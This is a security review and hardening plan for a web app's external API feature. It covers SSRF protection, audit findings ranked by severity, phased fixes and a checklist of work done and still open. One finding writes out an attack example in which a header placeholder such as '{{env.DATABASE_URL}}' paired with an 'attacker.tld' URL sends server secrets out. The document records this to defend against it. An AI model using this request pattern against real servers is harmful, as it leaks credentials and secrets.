# External API System — Review & Implementation Plan

_Reviewed: 2026-11-13 · Branch: `kirki-builder-plan` · Dashboard: `/dashboard/external-api`_

## 1. How it works today

| Layer | File | Role |
|---|---|---|
| Data model | `src/db/schemas/external-apis.schema.ts` | Saved presets: URL, method, headers, body, paths, field map, filters, cache TTL, timeout. Site-scoped. |
| Admin CRUD | `src/server/actions/external-api.actions.ts`, `src/server/services/external-apis.service.ts` | Create / list / update / delete presets, gated by `PAGES_EDIT`, filtered by `siteId`. |
| UI | `src/app/(admin)/dashboard/(shell)/external-api/_components/external-api-manager.tsx`, `src/builder/controls/external-api-fields.tsx` | Dashboard manager and builder inspector (fetches a sample, discovers keys, maps fields). |
| Runtime | `src/builder/loaders.ts` (`resolveExternalApiConfigFromProps`) → `src/server/services/listing-query.service.ts` (`resolveExternalApi`) | Merges preset with block props, fetches through `safeFetch`, extracts items, filters, builds facets, normalizes, caches in memory. |
| SSRF guard | `src/server/lib/safe-fetch.ts` | HTTPS only; blocks private / reserved / mapped IPv4 and IPv6 ranges; re-checks every redirect hop. |

**Done well:** `safeFetch` is solid (IPv6 spellings, NAT64, 6to4, per-hop redirect checks), site scoping is consistent, and preset action input is Zod-validated.

## 2. Security findings

### 🔴 P0 — Critical

#### 2.1 `inspectExternalApiAction` has no auth check and can leak secrets
- Location: `src/server/actions/listing.actions.ts` (`inspectExternalApiAction`).
- Exported from a `'use server'` file without `permissionProcedure`, so anyone — including logged-out visitors — can call it as a server action.
- It runs `interpolateEnvHeaders` (`listing-query.service.ts`), which replaces `{{env.ANY_NAME}}` with **any** environment variable.
- Attack: headers `{"X": "{{env.DATABASE_URL}}"}` + URL `https://attacker.tld` → the server sends the DB URL, auth secret, SMTP password, AI keys, etc. to the attacker.
- It also turns the server into a free outbound proxy.

#### 2.2 `resolveListingQuery` is a public action that accepts raw config and options
- Location: `src/server/actions/listing.actions.ts` (`resolveListingQuery`).
- A caller can pass an inline `apiConfig` → same env-variable leak as 2.1.
- A caller can set `options.site` to another site → cross-tenant read of published content.
- A caller can set `options.skipCache` → easy cache bypass / denial of service.

### 🟠 P1 — High

#### 2.3 Secrets stored in plain text and sent to the browser
- `headers` (bearer tokens) are stored unencrypted in `external_apis.headers`.
- `externalApisService.list()` sends them in full to the client manager component.
- Block props `apiHeaders` / `apiConfig` also store secrets inside page JSON, where page export, backups and `/api/v1/pages` may expose them.

#### 2.4 No response size limit / unbounded cache
- `response.json()` loads the whole body; a huge or endless response can exhaust memory.
- `listingCache` (`new Map`) has TTL but no size limit or eviction; every distinct filter/search value adds a key.

#### 2.5 Permission is too broad
- Any `PAGES_EDIT` user can point the server at any URL and attach env-variable secrets. Managing connections needs its own permission.

#### 2.6 DNS rebinding gap
- Documented in `safe-fetch.ts`: DNS is resolved once to check and again by `fetch`. Fix by pinning the checked IP via an undici `Agent` with a custom `lookup`.

### 🟡 P2 — Medium

| # | Issue | Location |
|---|---|---|
| 2.7 | External `url` / `image` values rendered directly into `href` / `src`. React 19.2 blocks `javascript:`, but allowlist `http(s):` and relative URLs, and add `rel="noopener"` for external links. | `src/builder/blocks/loop-item-field.tsx` (`resolveLoopItemHref`) |
| 2.8 | Raw error messages (including SSRF guard text with resolved internal IPs) reach the client. Return generic messages; log details. | `listing.actions.ts`, `listing-query.service.ts` |
| 2.9 | No audit log for preset create/update/delete; `external_apis` not covered by backup/export. | `audit.service.ts`, `src/server/backup/tables.ts` |
| 2.10 | `fields: z.array(z.any())` — unvalidated JSON written to jsonb. | `external-api.actions.ts` |
| 2.11 | No rate limit on outbound calls per preset or per IP. | runtime |

## 3. Implementation plan

### Phase 1 — Lock it down (P0/P1, ~1–2 days)

1. Wrap `inspectExternalApiAction` in `permissionProcedure(PERMISSIONS.EXTERNAL_API_MANAGE)`.
2. Split `resolveListingQuery`:
   - Public action accepts only `{ blockRef | presetId, page, filters, search }` — never inline `apiConfig`, `site`, or `skipCache`.
   - Inline config allowed only in editor / preview, behind auth.
   - `site` always resolved on the server.
3. Replace open `{{env.X}}` placeholders with a **secrets vault**:
   - Add an encrypted `external_api_secrets` table (or encrypted `secrets` jsonb on the preset), AES-256-GCM with a key from env (reuse the plugin secrets helper if possible).
   - Headers reference `{{secret.NAME}}`.
   - If env placeholders must stay, restrict them to an explicit allowlist (e.g. `EXTERNAL_API_ENV_ALLOWLIST`) or an `EXT_API_` prefix.
4. Mask secrets in `list()` / `getById()` output (`••••last4`); on update, keep the stored value when the client sends the mask back.
5. Add `fetchJsonCapped(response, maxBytes = 2 MB)` (streamed reader) and an LRU cap on `listingCache` (e.g. 500 entries).
6. Add `EXTERNAL_API_MANAGE` to `src/config/permissions.ts`; use it for the dashboard page and all preset actions.
7. Pin the DNS-checked IP in `safeFetch` to close the rebinding gap.
8. Tests:
   - Unauthenticated calls to inspect / resolve are rejected.
   - Env placeholders are not resolved from untrusted input.
   - Masked secret round-trip keeps the stored value.
   - Response size cap and cache eviction.

### Phase 2 — Reliability (~2–3 days)

- Store only `apiPresetId` in block props; stop copying headers into page JSON. Migration moves existing inline headers into presets.
- Stale-while-revalidate on API failure; retries with exponential backoff on 5xx / 429.
- Move cache from the in-memory Map to `unstable_cache` + `revalidateTag('ext-api:<id>')` (or Redis) so it works across instances; add a "Purge cache" button.
- Health columns: `lastStatus`, `lastError`, `lastFetchedAt`, `avgLatencyMs`, shown as a status badge in the manager.
- Audit log entries for preset CRUD; add `external_apis` to backup / export.
- Allowlist URL schemes for mapped links and images; route images through `next/image` with a remote-pattern policy.
- Generic client-facing errors; detailed server logs.
- Strict Zod schema for `fields` (`ExternalApiFieldMapping`).

### Phase 3 — Extensions

| Feature | Value |
|---|---|
| **Auth types** — Bearer, API key (header/query), Basic, OAuth2 client-credentials with token refresh | Covers most SaaS APIs without hand-built headers |
| **Pagination strategies** — page/limit, offset, cursor, `Link` header; pass pagination params to the API instead of fetching all and slicing | Large datasets |
| **Dynamic parameters** — `{{query.x}}`, `{{route.slug}}`, `{{page.id}}` in URL/body, typed and URL-encoded | Detail pages, search-driven listings |
| **Transform layer** — computed fields, date/number formatting, sandboxed JSONata (no `eval`) | Reshape messy APIs |
| **Single-item source** — `/items/[id]` route template backed by an external API | "Product page from API" |
| **GraphQL, RSS / XML / CSV sources** | More data types |
| **Scheduled sync into a collection** — cron pulls data into `collections` | Search, SEO, offline resilience |
| **Webhook-triggered revalidation** — signed inbound endpoint purges a preset's cache | Fresh data without short TTLs |
| **Request log viewer + "Test connection"** with redacted headers | Debugging |
| **Per-site host allowlist** (optional strict mode) | Security-conscious tenants |
| **Preset import/export + template gallery** (JSONPlaceholder, Shopify, Airtable…) | Faster onboarding |

## 4. Priority

Phase 1 items 1–3 must ship before this branch is deployed anywhere public. Items 1 and 2 are small changes, and today they let an anonymous visitor read the server's environment variables.

## 5. Checklist

_Updated 2026-11-13._

### Phase 1 — done
- [x] P0: auth on `inspectExternalApiAction` (`EXTERNAL_API_MANAGE`) — commit `4dd4956`
- [x] P0: lock down `resolveListingQuery`: public action takes a `presetId` only; inline config goes through the authenticated `resolveEditorListingQuery` — `4dd4956`
- [x] P0: `{{env.*}}` limited to `EXT_API_*` / `EXTERNAL_API_ENV_ALLOWLIST`; AES-256-GCM `{{secret.*}}` vault — `4dd4956`
- [x] P1: secrets and sensitive headers masked (`••••last4`) in list/get; masked round-trip keeps the stored value — `4dd4956`
- [x] P1: 2 MB `fetchJsonCapped` + 500-entry LRU `listingCache` — `4dd4956`
- [x] P1: `EXTERNAL_API_MANAGE` permission (Admin only) — `4dd4956`
- [x] P1: DNS pinning in `safeFetch` (pinned `lookup`) — `4dd4956`

### Gaps found after Phase 1 — done
- [x] Cross-origin redirects drop credential headers (`stripCrossOriginHeaders` in `safe-fetch.ts`)
- [x] Preset secrets only sent to the preset's own origin (`secretsForEndpoint` / `isSameOriginUrl`), in the block loaders and the inspector. Before this, a `pages.edit` user could set an inline `apiConfig` on a block that referenced a preset and send `{{secret.*}}` to any host.

### P2 — done
- [x] URL scheme allowlist for API item `url` / `image` (`safeExternalUrl`)
- [x] Generic visitor-facing errors (`publicExternalApiError`); details logged with the query string removed
- [x] Audit log for preset create / update / delete (`external_api` target; no secret values)
- [x] Backup coverage for `external_apis` (vault + credential headers scrubbed; restore is insert-only)
- [x] Strict, bounded `fields` schema (key, `fieldType`, nested fields)
- [x] Tests: `src/server/services/__tests__/external-api-hardening.test.ts`

### Still open
- [ ] P2: rate limiting on outbound calls (per preset / per IP)
- [ ] `{{env.EXT_API_*}}` is still resolved for inline block configs, so a `pages.edit` user can send allowlisted env values to any URL. Close this with Phase 2's "presets only" move (or set `allowEnvPlaceholders: false` for non-preset configs).
- [ ] `pinnedNodeFetch` does not decompress gzip/br; it only works because no `Accept-Encoding` is sent. Strip a user-set `Accept-Encoding` header or decompress.
- [ ] Phase 2 reliability items
- [ ] Phase 3 extensions
